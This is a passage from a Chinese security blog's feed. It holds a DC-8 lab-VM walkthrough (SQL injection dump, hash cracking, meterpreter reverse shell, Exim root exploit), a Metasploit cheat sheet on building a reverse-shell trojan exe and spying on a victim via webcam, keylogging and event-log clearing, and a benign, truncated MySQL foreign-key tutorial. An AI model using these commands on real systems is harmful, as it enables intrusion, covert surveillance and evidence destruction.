class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索一下框架漏洞</span></span><br><span class="line">searchsploit Drupal 7</span><br></pre></td></tr></table></figure><ul><li>啥也没有，直接去网页看看吧~</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发现这里有个nid比较刺眼</span></span><br><span class="line">http://192.168.0.29/?nid=1</span><br></pre></td></tr></table></figure><ul><li>点一个文章nid就变一下，可能有sql输入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap 跑起来</span></span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 --dbms mysql --dbs</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db --tables</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db -T users --column</span><br><span class="line">sqlmap -u http://192.168.0.29/?nid=1 -D d7db -T users -C name,pass --dump</span><br><span class="line"><span class="comment"># 依次执行上面的之后就能得到以下结果</span></span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span> |</span><br><span class="line">| john  | <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure><ul><li><p>把上面的结果写到一个文件里面，然后使用 <code>Johnny</code> 把文件导入进去</p></li><li><p><img data-src="../images/mdImages/image-20200504224312509.png" alt="image-20200504224312509"></p></li><li><p>这里值只看了john的密码: <code>turtle</code></p></li><li><p>然后我们就能去登录后台试试</p></li><li><p>Drupal的后台默认在/user/login下</p></li><li><p>直接访问：<a href="http://192.168.0.29/user/login，账号" target="_blank" rel="noopener">http://192.168.0.29/user/login，账号</a> <code>john</code> 密码 <code>turtle</code></p></li><li><p>然后就登录进去了</p></li><li><p>拿shell</p></li><li><p><img data-src="../images/mdImages/image-20200504224920158.png" alt="image-20200504224920158"></p></li><li><p><img data-src="../images/mdImages/image-20200504224947210.png" alt="image-20200504224947210"></p></li><li><p><img data-src="../images/mdImages/image-20200504225005560.png" alt="image-20200504225005560"></p></li><li><p><img data-src="../images/mdImages/image-20200504225051840.png" alt="image-20200504225051840"></p></li><li><p>我这里用的是<code>metasploit</code></p></li><li><p>先 <code>msfconsole</code></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.0.21</span><br><span class="line">LHOST =&gt; 192.168.0.21</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.21:4444</span><br></pre></td></tr></table></figure><ul><li><p>然后到网站去提交一个留言</p></li><li><p><img data-src="../images/mdImages/image-20200504225740483.png" alt="image-20200504225740483"></p></li><li><p>msf就得到了会话</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><ul><li>就可以进到shell了</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获得标准shell</span></span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line"><span class="comment"># 然后找其他用户看看是否有什么发现</span></span><br><span class="line"><span class="built_in">cd</span> /home;ls</span><br><span class="line">dc8user</span><br><span class="line">ls -l dc8user</span><br><span class="line"><span class="comment"># 啥也没有</span></span><br><span class="line"><span class="comment"># 然后使用</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 找suid的文件提权，结果如下：</span></span><br></pre></td></tr></table></figure><ul><li><p><img data-src="../images/mdImages/image-20200504230239506.png" alt="image-20200504230239506"></p></li><li><p>几经周转了解到<code>exim4</code>有已知的提权漏洞</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim</span><br><span class="line">Exim 4.87 - 4.91 - Local Privilege Escalation   | exploits/linux/<span class="built_in">local</span>/46996.sh</span><br><span class="line"><span class="comment"># 使用的是46996.sh</span></span><br><span class="line"><span class="comment"># 先把他复制到/tmp下改成exp.sh</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在靶机shell执行 </span></span><br><span class="line">scp root@192.168.0.21:/tmp/exp.sh /tmp</span><br><span class="line"><span class="comment"># 然后执行</span></span><br><span class="line">./exp.sh -m netcat</span><br><span class="line"><span class="comment"># 就能得到root的shell了</span></span><br></pre></td></tr></table></figure><ul><li><p><img data-src="../images/mdImages/image-20200504232730631.png" alt="image-20200504232730631"></p></li><li><p><img data-src="../images/mdImages/image-20200504232745210.png" alt="image-20200504232745210"></p></li></ul><h2><span id="the_end"><strong>THE_END!</strong></span></h2>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc-8-靶机渗透&quot;&gt;DC-8 靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-渗透过程&quot;&gt;1. 渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#__the_end__&quot;&gt;&lt;strong&gt;THE_END!&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit的一套基本连招</title>
    <link href="https://atc96.top/Metasploit/"/>
    <id>https://atc96.top/Metasploit/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T11:16:28.424Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#msf一套基本连招">msf&gt;&gt;一套基本连招:</a><ul><li><a href="#1生成一个木马文件">1.生成一个木马文件</a></li><li><a href="#2打开控制台">2.打开控制台</a></li><li><a href="#3使用exploitmultihandler模块">3.使用exploit/multi/handler模块</a></li><li><a href="#4设置payload">4.设置payload</a></li><li><a href="#5设置lhost与生成的lhost一致">5.设置lhost（与生成的lhost一致）</a></li><li><a href="#6设置lport与生成的lport一致">6.设置lport（与生成的lport一致）</a></li><li><a href="#7查看设置好的参数">7.查看设置好的参数</a></li><li><a href="#8开始监听">8.开始监听</a></li><li><a href="#9有目标连接进来后">9.有目标连接进来后</a></li><li><a href="#10msf命令文档">10.msf命令文档</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="msfgtgt一套基本连招">msf&gt;&gt;一套基本连招:</span></h1><h2><span id="1生成一个木马文件">1.生成一个木马文件</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=5555 -f exe -o met.exe</span><br></pre></td></tr></table></figure><h2><span id="2打开控制台">2.打开控制台</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><h2><span id="3使用exploitmultihandler模块">3.使用exploit/multi/handler模块</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure><h2><span id="4设置payload">4.设置payload</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h2><span id="5设置lhost与生成的lhost一致">5.设置lhost（与生成的lhost一致）</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.0.108</span><br></pre></td></tr></table></figure><h2><span id="6设置lport与生成的lport一致">6.设置lport（与生成的lport一致）</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 5555</span><br></pre></td></tr></table></figure><h2><span id="7查看设置好的参数">7.查看设置好的参数</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><h2><span id="8开始监听">8.开始监听</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><h2><span id="9有目标连接进来后">9.有目标连接进来后</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">连接好了下面的命令都可以执行：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 让他不能用鼠标uictl开关键盘/鼠标 uictl [<span class="built_in">enable</span>/<span class="built_in">disable</span>] [keyboard/mouse/all] </span></span><br><span class="line">uictl disable mouse #禁用鼠标</span><br><span class="line">uictl disable keyboard #禁用键盘 </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果开了摄像头拍照webcam摄像头</span></span><br><span class="line">webcam_list #查看摄像头</span><br><span class="line">webcam_snap #通过摄像头拍照</span><br><span class="line">webcam_stream #通过摄像头开启视频</span><br><span class="line">execute#在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"><span class="meta">#</span><span class="bash"> clearav清除日志</span></span><br><span class="line">clearev #清除windows中的应用程序日志、系统日志、安全日志</span><br><span class="line">ipconfig/ifconfig </span><br><span class="line">netstat –ano # 基本网络命令</span><br><span class="line">arp #arp信息</span><br><span class="line">getproxy #查看代理信息</span><br><span class="line">route #查看路由</span><br><span class="line"><span class="meta">#</span><span class="bash"> 信息收集的脚本位于：</span></span><br><span class="line">/usr/share/metasploit-framework/modules/post/windows/gather</span><br><span class="line">/usr/share/metasploit-framework/modules/post/linux/gather</span><br><span class="line"><span class="meta">#</span><span class="bash"> 信息收集的脚本较多，仅列几个常用的：</span></span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain #查找域控</span><br></pre></td></tr></table></figure><h2><span id="10msf命令文档">10.msf命令文档</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令详情：</span></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for "load"</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    pwd           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    show_mount    List all mount points/logical drives</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    getproxy      Display the current proxy configuration</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    resolve       Resolve a set of host names on the target</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    clearev       Clear the event log</span><br><span class="line">    drop_token    Relinquishes any active impersonation token.</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getsid        Get the SID of the user that the server is running as</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    localtime     Displays the target system's local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    pkill         Terminate processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    reboot        Reboots the remote computer</span><br><span class="line">    reg           Modify and interact with the remote registry</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    shutdown      Shuts down the remote computer</span><br><span class="line">    steal_token   Attempts to steal an impersonation token from the target process</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line">Stdapi: User interface Commands</span><br><span class="line">===============================</span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    enumdesktops   List all accessible desktops and window stations</span><br><span class="line">    getdesktop     Get the current meterpreter desktop</span><br><span class="line">    idletime       Returns the number of seconds the remote user has been idle</span><br><span class="line">    keyscan_dump   Dump the keystroke buffer</span><br><span class="line">    keyscan_start  Start capturing keystrokes</span><br><span class="line">    keyscan_stop   Stop capturing keystrokes</span><br><span class="line">    screenshot     Grab a screenshot of the interactive desktop</span><br><span class="line">    setdesktop     Change the meterpreters current desktop</span><br><span class="line">    uictl          Control some of the user interface components</span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat    Start a video chat</span><br><span class="line">    webcam_list    List webcams</span><br><span class="line">    webcam_snap    Take a snapshot from the specified webcam</span><br><span class="line">    webcam_stream  Play a video stream from the specified webcam</span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play an audio file on target system, nothing written on disk</span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    getsystem     Attempt to elevate your privilege to that of local system.</span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    hashdump      Dumps the contents of the SAM database</span><br><span class="line">Priv: Timestomp Commands</span><br><span class="line">========================</span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    timestomp     Manipulate file MACE attribute</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#msf一套基本连招&quot;&gt;msf&amp;gt;&amp;gt;一套基本连招:&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1生成一个木马文件&quot;&gt;1.生成一个木马文件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2打开控制台&quot;&gt;2.打开控制台&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3使用exploitmultihandler模块&quot;&gt;3.使用exploit/multi/handler模块&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#4设置payload&quot;&gt;4.设置payload&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#5设置lhost与生成的lhost一致&quot;&gt;5.设置lhost（与生成的lhost一致）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#6设置lport与生成的lport一致&quot;&gt;6.设置lport（与生成的lport一致）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#7查看设置好的参数&quot;&gt;7.查看设置好的参数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#8开始监听&quot;&gt;8.开始监听&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#9有目标连接进来后&quot;&gt;9.有目标连接进来后&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#10msf命令文档&quot;&gt;10.msf命令文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="渗透工具" scheme="https://atc96.top/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>MySQL</title>
    <link href="https://atc96.top/mysql/"/>
    <id>https://atc96.top/mysql/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T11:30:08.557Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#mysql">MySQL</a><ul><li><a href="#1-mysql外键">1. Mysql外键</a><ul><li><a href="#1-外键设计">1. 外键设计</a></li><li><a href="#2-数据操作">2. 数据操作</a></li></ul></li><li><a href="#2-linux下mysql数据导入导出">2. Linux下Mysql数据导入导出</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="mysql">MySQL</span></h1><h2><span id="1-mysql外键">1. Mysql外键</span></h2><h3><span id="1-外键设计">1. 外键设计</span></h3><ol><li><p>创建一个用户表 (<strong>被关联表</strong>)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> userinfo(uid <span class="built_in">int</span>  primary <span class="keyword">key</span> auto_increment <span class="keyword">not</span> <span class="literal">NULL</span>, </span><br><span class="line">                      <span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">NULL</span> , ...);</span><br></pre></td></tr></table></figure></li><li><p>创建一个数据表 (<strong>关联表</strong>)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> userdata(did <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment <span class="keyword">not</span> <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="keyword">data</span> <span class="built_in">text</span> ...,</span><br><span class="line">                      <span class="comment">--指定该表的某个字段与其他表为外键关系</span></span><br><span class="line">                      udid <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">NULL</span>,</span><br><span class="line">                      <span class="keyword">foreign</span> <span class="keyword">key</span>(udid) <span class="keyword">references</span> userinfo(uid));</span><br><span class="line">                      <span class="comment">--这样udid与 `userinfo` 表的uid构成外键关系</span></span><br></pre></td></tr></table></figure></li></ol><h3><span id="2-数据操作">2. 数据操作</span></h3><ol><li><p>插入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> - 1.必须先插入被关联表(userinfo)的数据，再插入关联表(userdata)的数据。</span><br><span class="line"><span class="comment">-- userinfo 表插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userinfo(uid,<span class="keyword">name</span>,...) <span class="keyword">values</span>(<span class="literal">NULL</span>,<span class="string">'root'</span>,...);</span><br><span class="line">...</span><br><span class="line"><span class="comment">-- userdata 表插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> userdata(did,<span class="keyword">data</span>,udid) <span class="keyword">values</span>(<span class="literal">NULL</span>,<span class="string">'data....'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">--如果关联表(userdata)插入的uid在被关联表(userinfo)中不存在会报错</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>更新数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> userdata <span class="keyword">set</span> udid=<span class="number">999</span> <span class="keyword">where</span> did=<span class="number">1</span>;</span><br><span class="line"><span class="comment">--需要注意的是当你设置的udid在userinfo表中找不到的时候会报错</span></span><br><span class="line"><span class="comment">--同时还要注意did的主键约束</span></span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>删除数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 要先删除已关联表字段(userdata)，才能修改被关联表(userinfo)中的关联uid字段。</span></span><br><span class="line"><span class="comment">-- 如果关联表(userinfo) uid 已经被关联了，那删除是就会报错</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>高级查询</p><ul><li><p>内连接查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> userdata <span class="keyword">join</span> userinfo <span class="keyword">on</span> userdata.udid = 